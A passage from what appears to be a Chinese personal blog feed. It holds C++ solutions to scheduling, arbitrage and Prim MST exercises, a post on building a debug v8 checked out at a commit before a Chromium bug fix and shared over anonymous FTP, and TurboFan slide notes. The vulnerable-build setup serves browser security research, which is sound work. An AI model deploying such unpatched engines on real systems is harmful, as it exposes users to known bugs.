<span class="number">0</span>; j &lt;= sum; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (j &lt; a[i]) &#123;<span class="comment">//A机器时间不足，只能用B的</span></span><br><span class="line">                dp[i][j] = dp[i - <span class="number">1</span>][j] + b[i];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//dp[i][j] = dp[i-1][j]+b[i]代表第i个任务交给B来做，所以做完前i个任务的时候,A机器和前i - 1的任务一样，还是花了j分钟，而B机器则花dp[i-1][j]+b[i]分钟；</span></span><br><span class="line">                <span class="comment">//dp[i][j] = dp[i-1][j-a[i]]代表第i个任务交给A来做，现在的A机器花费时间是j，所以在前i - 1个任务完成的时候，A机器是花了j-a[i]分钟的，所以现在B机器还是花了dp[i-1][j-a[i]]分钟；</span></span><br><span class="line">                dp[i][j] = min(dp[i - <span class="number">1</span>][j] + b[i], dp[i - <span class="number">1</span>][j - a[i]]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">999999</span>;</span><br><span class="line">    <span class="comment">//max(dp[n][i],i) 表示完成前n个作业A机器花i分钟 B机器花dp[n][i]分钟情况下，最迟完工时间</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= sum; i++)</span><br><span class="line">        ans = min(ans, max(dp[n][i], i));</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; ans &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Arbitrage"><a href="#Arbitrage" class="headerlink" title="Arbitrage"></a>Arbitrage</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-28-170934.png" alt=""><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="built_in">map</span>&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt; money;</span><br><span class="line"><span class="keyword">double</span> rates[<span class="number">100</span>][<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Arbitrage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; n; k++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">double</span> tmp = rates[i][k] * rates[k][j];</span><br><span class="line">                rates[i][j] = max(tmp, rates[i][j]);</span><br><span class="line">                <span class="keyword">if</span> (rates[i][j] * rates[j][i] &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">0</span>, countt = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; n &amp;&amp; n) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="built_in">string</span> temp;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; temp;</span><br><span class="line">            money[temp] = i;</span><br><span class="line">            rates[i][i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> m;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; m;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="built_in">string</span> a, b;</span><br><span class="line">            <span class="keyword">double</span> rate;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; a &gt;&gt; rate &gt;&gt; b;</span><br><span class="line">            rates[money[a]][money[b]] = rate;</span><br><span class="line">        &#125;</span><br><span class="line">        flag = Arbitrage();</span><br><span class="line">        <span class="keyword">if</span> (flag)</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"Case "</span> &lt;&lt; countt++ &lt;&lt; <span class="string">" Yes"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"Case "</span> &lt;&lt; countt++ &lt;&lt; <span class="string">" No"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="求最小生成树-Prim算法）"><a href="#求最小生成树-Prim算法）" class="headerlink" title="求最小生成树(Prim算法）"></a>求最小生成树(Prim算法）</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-28-171033.png" alt=""><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inf 32767</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">int</span> e;</span><br><span class="line">    <span class="keyword">char</span> data[<span class="number">500</span>];</span><br><span class="line">    <span class="keyword">int</span> edge[<span class="number">500</span>][<span class="number">500</span>];</span><br><span class="line">&#125; Graph;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="keyword">int</span> cost;</span><br><span class="line">&#125; mincost;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">int</span> y;</span><br><span class="line">    <span class="keyword">int</span> weight;</span><br><span class="line">&#125; EDGE;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="keyword">int</span> flag;</span><br><span class="line">&#125; F;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(Graph &amp;G, <span class="keyword">int</span> n, <span class="keyword">int</span> e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, k, w;</span><br><span class="line">    <span class="keyword">char</span> a, b;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; G.data[i];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == j)</span><br><span class="line">                G.edge[i][j] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                G.edge[i][j] = inf;<span class="comment">//模板里是G.edge[i][j]=100;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; e; k++) &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; a;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; b;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; w;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">            <span class="keyword">if</span> (G.data[i] == a) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            <span class="keyword">if</span> (G.data[j] == b) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        G.edge[i][j] = w;</span><br><span class="line">        G.edge[j][i] = w;</span><br><span class="line">    &#125;</span><br><span class="line">    G.n = n;</span><br><span class="line">    G.e = e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Prim</span><span class="params">(Graph &amp;G, <span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> lowcost[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> min, closest[<span class="number">100</span>], i, j, k;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; G.n; i++) &#123;</span><br><span class="line">        lowcost[i] = G.edge[v][i];</span><br><span class="line">        closest[i] = v;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; G.n; i++) &#123;</span><br><span class="line">        min = inf;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; G.n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (lowcost[j] &amp;&amp; lowcost[j] &lt; min) &#123;</span><br><span class="line">                min = lowcost[j];</span><br><span class="line">                k = j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">'('</span> &lt;&lt; G.data[closest[k]] &lt;&lt; <span class="string">','</span> &lt;&lt; G.data[k] &lt;&lt; <span class="string">')'</span>;</span><br><span class="line">        lowcost[k] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; G.n; j++)</span><br><span class="line">            <span class="keyword">if</span> (G.edge[k][j] &amp;&amp; G.edge[k][j] &lt; lowcost[j]) &#123;</span><br><span class="line">                lowcost[j] = G.edge[k][j];<span class="comment">//更新距离</span></span><br><span class="line">                closest[j] = k;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Graph my;</span><br><span class="line">    <span class="keyword">int</span> n, e;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n &gt;&gt; e;</span><br><span class="line">    create(my, n, e);</span><br><span class="line">    Prim(my, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>v8调试环境搭建(解决遇到的一些问题)</title>
      <link href="/2018/06/26/v8_environment/"/>
      <url>/2018/06/26/v8_environment/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>写这个是因为之前一直没有一个特别好的v8调试环境搭建的方法。<br>最主要的原因就是墙,然后花了一晚上摸索了一个感觉还行的解决方案吧。。</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p><a href="https://cloud.google.com/" target="_blank" rel="noopener">谷歌云</a>的centos 7 x64<br>地区选台湾，4核机器就行。<br>其他国外云主机应该也行。。不过谷歌云用完了删除实例就好，很方便。</p><h2 id="fetch源码"><a href="#fetch源码" class="headerlink" title="fetch源码"></a>fetch源码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo yum groupinstall &quot;Development Tools&quot;  </span><br><span class="line">sudo yum install -y git gdb bzip2 wget</span><br><span class="line">cd ~</span><br><span class="line">git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line">export PATH=`pwd`/depot_tools:&quot;$PATH&quot;</span><br><span class="line">mkdir v8</span><br><span class="line">cd v8</span><br><span class="line">fetch v8</span><br><span class="line">中途中断了就gclient sync</span><br></pre></td></tr></table></figure><h2 id="切换到有漏洞的分支"><a href="#切换到有漏洞的分支" class="headerlink" title="切换到有漏洞的分支"></a>切换到有漏洞的分支</h2><p>举例来说</p><ul><li>bug<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=659475" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=659475</a></li><li><p>fix commit<br><a href="https://chromium.googlesource.com/v8/v8/+/2bd7464ec1efc9eb24a38f7400119a5f2257f6e6" target="_blank" rel="noopener">https://chromium.googlesource.com/v8/v8/+/2bd7464ec1efc9eb24a38f7400119a5f2257f6e6</a></p></li><li><p>找到hash和test代码<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-25-201821.png" alt=""></p></li><li>切换<br><code>cd ~/v8/v8</code><br><code>git reset --hard a7a350012c05f644f3f373fb48d7ac72f7f60542</code></li><li><p>同步并编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gclient sync</span><br><span class="line">tools/dev/v8gen.py x64.debug </span><br><span class="line">ninja -C out.gn/x64.debug d8</span><br></pre></td></tr></table></figure></li><li><p>测试<br>用test里的代码测试一下效果，省略。</p></li></ul><h2 id="搭建ftp服务器"><a href="#搭建ftp服务器" class="headerlink" title="搭建ftp服务器"></a>搭建ftp服务器</h2><p>打包编译好的v8目录，<code>tar -czvf v8.tar v8</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install vsftpd -y</span><br><span class="line">sudo service vsftpd start</span><br><span class="line">sudo netstat -nltp | grep 21</span><br></pre></td></tr></table></figure></p><p>此时，访问 ftp://<ip 地址=""> 可浏览机器上的/var/ftp目录了。<br>把源码cp到这个目录下，直接下载即可了。</ip></p><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p>然后删除原来的，对tar进行解包，得到我们要调试的v8<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-25-203426.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-25-203519.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-25-203545.jpg" alt=""></p><h2 id="update"><a href="#update" class="headerlink" title="update"></a>update</h2><p><code>tools/dev/gm.py x64.debug d8</code><br>参考<a href="https://v8.dev/docs/build-gn" target="_blank" rel="noopener">https://v8.dev/docs/build-gn</a></p>]]></content>
      
      <categories>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> v8 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>v8 slide collection</title>
      <link href="/2018/06/18/v8_ppt/"/>
      <url>/2018/06/18/v8_ppt/</url>
      <content type="html"><![CDATA[<h2 id="The-TurboFan-architecture-entry-points"><a href="#The-TurboFan-architecture-entry-points" class="headerlink" title="The TurboFan architecture / entry points"></a>The TurboFan architecture / entry points</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-135445.png" alt=""></p><h2 id="TurboFan-pipeline-high-level"><a href="#TurboFan-pipeline-high-level" class="headerlink" title="TurboFan pipeline (high-level)"></a>TurboFan pipeline (high-level)</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-135820.png" alt=""></p><h2 id="Code-generation-example"><a href="#Code-generation-example" class="headerlink" title="Code generation example"></a>Code generation example</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-135911.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">                  -- B0 start (construct frame) --</span><br><span class="line">0x3caafc104060     0  55             push rbp</span><br><span class="line">0x3caafc104061     1  4889e5         REX.W movq rbp,rsp</span><br><span class="line">0x3caafc104064     4  56             push rsi</span><br><span class="line">0x3caafc104065     5  57             push rdi</span><br><span class="line">0x3caafc104066     6  493ba5600c0000 REX.W cmpq rsp,[r13+0xc60]</span><br><span class="line">0x3caafc10406d    13  0f863d000000   jna 80  (0x3caafc1040b0)</span><br><span class="line">                  -- B2 start --</span><br><span class="line">                  -- B3 start (deconstruct frame) --</span><br><span class="line">0x3caafc104073    19  488b4518       REX.W movq rax,[rbp+0x18]</span><br><span class="line">0x3caafc104077    23  a801           test al,0x1</span><br><span class="line">0x3caafc104079    25  0f8548000000   jnz 103  (0x3caafc1040c7)</span><br><span class="line">0x3caafc10407f    31  488b5d10       REX.W movq rbx,[rbp+0x10]</span><br><span class="line">0x3caafc104083    35  f6c301         testb rbx,0x1</span><br><span class="line">0x3caafc104086    38  0f8540000000   jnz 108  (0x3caafc1040cc)</span><br><span class="line">0x3caafc10408c    44  488bd3         REX.W movq rdx,rbx</span><br><span class="line">0x3caafc10408f    47  48c1ea20       REX.W shrq rdx, 32</span><br><span class="line">0x3caafc104093    51  488bc8         REX.W movq rcx,rax</span><br><span class="line">0x3caafc104096    54  48c1e920       REX.W shrq rcx, 32</span><br><span class="line">0x3caafc10409a    58  03d1           addl rdx,rcx</span><br><span class="line">0x3caafc10409c    60  0f802f000000   jo 113  (0x3caafc1040d1)</span><br><span class="line">0x3caafc1040a2    66  48c1e220       REX.W shlq rdx, 32</span><br><span class="line">0x3caafc1040a6    70  488bc2         REX.W movq rax,rdx</span><br><span class="line">0x3caafc1040a9    73  488be5         REX.W movq rsp,rbp</span><br><span class="line">0x3caafc1040ac    76  5d             pop rbp</span><br><span class="line">0x3caafc1040ad    77  c21800         ret 0x18</span><br><span class="line">                  -- B4 start (no frame) --</span><br><span class="line">                  -- B1 start (deferred) --</span><br><span class="line">                  -- B0 start (construct frame) --</span><br><span class="line">0x3caafc104060     0  55             push rbp</span><br><span class="line">0x3caafc104061     1  4889e5         REX.W movq rbp,rsp</span><br><span class="line">0x3caafc104064     4  56             push rsi</span><br><span class="line">0x3caafc104065     5  57             push rdi</span><br><span class="line">0x3caafc104066     6  493ba5600c0000 REX.W cmpq rsp,[r13+0xc60]</span><br><span class="line">0x3caafc10406d    13  0f863d000000   jna 80  (0x3caafc1040b0)</span><br><span class="line">                  -- B2 start --</span><br><span class="line">                  -- B3 start (deconstruct frame) --</span><br><span class="line">0x3caafc104073    19  488b4518       REX.W movq rax,[rbp+0x18]</span><br><span class="line">0x3caafc104077    23  a801           test al,0x1</span><br><span class="line">0x3caafc104079    25  0f8548000000   jnz 103  (0x3caafc1040c7)</span><br><span class="line">0x3caafc10407f    31  488b5d10       REX.W movq rbx,[rbp+0x10]</span><br><span class="line">0x3caafc104083    35  f6c301         testb rbx,0x1</span><br><span class="line">0x3caafc104086    38  0f8540000000   jnz 108  (0x3caafc1040cc)</span><br><span class="line">0x3caafc10408c    44  488bd3         REX.W movq rdx,rbx</span><br><span class="line">0x3caafc10408f    47  48c1ea20       REX.W shrq rdx, 32</span><br><span class="line">0x3caafc104093    51  488bc8         REX.W movq rcx,rax</span><br><span class="line">0x3caafc104096    54  48c1e920       REX.W shrq rcx, 32</span><br><span class="line">0x3caafc10409a    58  03d1           addl rdx,rcx</span><br><span class="line">0x3caafc10409c    60  0f802f000000   jo 113  (0x3caafc1040d1)</span><br><span class="line">0x3caafc1040a2    66  48c1e220       REX.W shlq rdx, 32</span><br><span class="line">0x3caafc1040a6    70  488bc2         REX.W movq rax,rdx</span><br><span class="line">0x3caafc1040a9    73  488be5         REX.W movq rsp,rbp</span><br><span class="line">0x3caafc1040ac    76  5d             pop rbp</span><br><span class="line">0x3caafc1040ad    77  c21800         ret 0x18</span><br><span class="line">                  -- B4 start (no frame) --</span><br><span class="line">                  -- B1 start (deferred) --</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-141841.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-142111.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-142522.png" alt=""></p><h2 id="Turbofan-IR"><a href="#Turbofan-IR" class="headerlink" title="Turbofan IR"></a>Turbofan IR</h2><h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><ul><li>Graph based IR<ul><li>Nodes for operations.</li><li>Edges for value flow, control flow and dependencies.</li><li>No distinction between basic blocks and statements.</li><li>Single-static assignment.</li></ul></li><li>High/middle/low-level IR layering.</li><li>Side effects modelled as edges.<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-143530.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-143638.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-143823.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-143847.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-143923.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-144159.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-144341.png" alt=""></li></ul><h3 id="节点分层"><a href="#节点分层" class="headerlink" title="节点分层"></a>节点分层</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-145153.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-145249.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-145907.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-150532.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-150444.png" alt=""></p><h3 id="IR分层和phases"><a href="#IR分层和phases" class="headerlink" title="IR分层和phases"></a>IR分层和phases</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-150639.png" alt=""></p><h4 id="lowering-amp-amp-Typed-Lowering"><a href="#lowering-amp-amp-Typed-Lowering" class="headerlink" title="lowering&amp;&amp;Typed Lowering"></a>lowering&amp;&amp;Typed Lowering</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-150811.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-150917.png" alt=""></p><h4 id="Representation-selection"><a href="#Representation-selection" class="headerlink" title="Representation selection"></a>Representation selection</h4><p>Representation selection now chooses machine representation and inserts conversions.<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-151052.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-151159.png" alt=""></p><h4 id="Scheduling"><a href="#Scheduling" class="headerlink" title="Scheduling"></a>Scheduling</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-151948.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-152002.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-152013.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-152023.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-152032.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-13-152108.png" alt=""></p><h2 id="High-performance-JavaScript-with-V8"><a href="#High-performance-JavaScript-with-V8" class="headerlink" title="High performance JavaScript with V8"></a>High performance JavaScript with V8</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-185932.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-17-190018.png" alt=""><br><img 